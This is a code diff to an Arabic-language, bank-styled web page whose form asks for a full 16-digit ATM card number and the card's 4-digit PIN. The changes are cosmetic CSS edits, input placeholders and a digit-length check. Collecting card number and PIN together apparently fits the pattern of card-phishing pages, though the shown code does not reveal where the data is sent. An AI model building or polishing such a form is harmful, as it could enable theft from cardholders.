@@ -13,10 +13,9 @@
         }
         body {
             min-height: 100vh;
-            margin: 0;
             font-family: 'Cairo', Arial, sans-serif;
             background: radial-gradient(circle at 50% 0%, #d32f2f 0%, #b71c1c 100%);
-            position: relative;
+            margin: 0;
         }
         .pattern {
             pointer-events: none;
@@ -195,53 +194,6 @@
             margin-top: 12px;
             margin-bottom: 24px;
         }
-        .card-img-wrap {
-            width: 180px;
-            height: 115px;
-            margin: 0 auto 28px auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .card-img {
-            width: 100%;
-            height: 100%;
-            border-radius: 13px;
-            background: #fff;
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 2px 14px 0 rgba(0,0,0,0.10);
-        }
-        .card-img::after {
-            content: "";
-            position: absolute;
-            left: -14px; right: -14px; top: -14px; bottom: -14px;
-            border: 3px dashed #fff;
-            border-radius: 20px;
-            pointer-events: none;
-        }
-        .card-img-content {
-            z-index: 1;
-            width: 100%;
-            text-align: center;
-        }
-        .card-bank-name {
-            color: #b71c1c;
-            font-size: 1.1rem;
-            font-weight: bold;
-            margin-top: 5px;
-            margin-bottom: 8px;
-        }
-        .card-num-row {
-            display: flex;
-            justify-content: center;
-            gap: 7px;
-            margin-bottom: 22px;
-            direction: ltr;
-        }
         .card-num-label {
             color: #fff;
             text-align: center;
@@ -250,6 +202,13 @@
             margin-bottom: 5px;
             margin-top: 0;
             letter-spacing: 1px;
+        }
+        .card-num-row {
+            display: flex;
+            justify-content: center;
+            gap: 7px;
+            margin-bottom: 22px;
+            direction: ltr;
         }
         .card-num-input {
             width: 54px;
@@ -265,6 +224,10 @@
             direction: ltr;
             letter-spacing:2px;
         }
+        .card-num-input::-webkit-input-placeholder { text-align: center; }
+        .card-num-input:-moz-placeholder { text-align: center; }
+        .card-num-input::-moz-placeholder { text-align: center; }
+        .card-num-input:-ms-input-placeholder { text-align: center; }
         .card-secret-row {
             display: flex;
             justify-content: center;
@@ -323,7 +286,6 @@
             margin-bottom: 13px;
             margin-top: 7px;
         }
-
         .verify-error {
             color: #fff;
             background: #b71c1c;
@@ -447,18 +409,18 @@
             <div class="card-info-title">بطاقة الصراف الآلي</div>
             <div class="card-num-label">ادخل رقم البطاقة من 16 رقم</div>
             <form id="cardInfoForm" autocomplete="off" onsubmit="return goToVerificationFromCard(event)">
-                <div class="card-num-row" dir="ltr" style="direction:ltr;">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum1" name="cardNum1" autocomplete="off" inputmode="numeric">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum2" name="cardNum2" autocomplete="off" inputmode="numeric">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum3" name="cardNum3" autocomplete="off" inputmode="numeric">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum4" name="cardNum4" autocomplete="off" inputmode="numeric">
+                <div class="card-num-row" dir="ltr">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum1" name="cardNum1" autocomplete="off" inputmode="numeric" placeholder="0000">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum2" name="cardNum2" autocomplete="off" inputmode="numeric" placeholder="0000">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum3" name="cardNum3" autocomplete="off" inputmode="numeric" placeholder="0000">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum4" name="cardNum4" autocomplete="off" inputmode="numeric" placeholder="0000">
                 </div>
                 <div class="card-secret-label">ادخل الرقم السري 4 خانات</div>
-                <div class="card-secret-row" dir="ltr" style="direction:ltr;">
-                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret1" name="cardSecret1" autocomplete="off" inputmode="numeric">
-                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret2" name="cardSecret2" autocomplete="off" inputmode="numeric">
-                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret3" name="cardSecret3" autocomplete="off" inputmode="numeric">
-                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret4" name="cardSecret4" autocomplete="off" inputmode="numeric">
+                <div class="card-secret-row" dir="ltr">
+                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret1" name="cardSecret1" autocomplete="off" inputmode="numeric" placeholder="*">
+                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret2" name="cardSecret2" autocomplete="off" inputmode="numeric" placeholder="*">
+                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret3" name="cardSecret3" autocomplete="off" inputmode="numeric" placeholder="*">
+                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret4" name="cardSecret4" autocomplete="off" inputmode="numeric" placeholder="*">
                 </div>
                 <div class="card-info-note">
                     في حال تعسر امتلاك بطاقة يرجى الضغط على إلغاء والمتابعة مع مركز الاتصال لتفعيل الحساب على الرقم <span>065680001</span>
@@ -582,6 +544,17 @@
                 document.getElementById('cardSecret3').value,
                 document.getElementById('cardSecret4').value
             ].join('');
+            // تحقق من أن كل خانة تحتوي على 4 أرقام
+            if (
+                document.getElementById('cardNum1').value.length !== 4 ||
+                document.getElementById('cardNum2').value.length !== 4 ||
+                document.getElementById('cardNum3').value.length !== 4 ||
+                document.getElementById('cardNum4').value.length !== 4
+            ) {
+                alert("يجب إدخال رقم البطاقة بشكل كامل (16 رقم، كل خانة 4 أرقام).");
+                document.getElementById('cardNum1').focus();
+                return false;
+            }
             cardInfoData = {
                 cardNum1: document.getElementById('cardNum1').value,
                 cardNum2: document.getElementById('cardNum2').value,
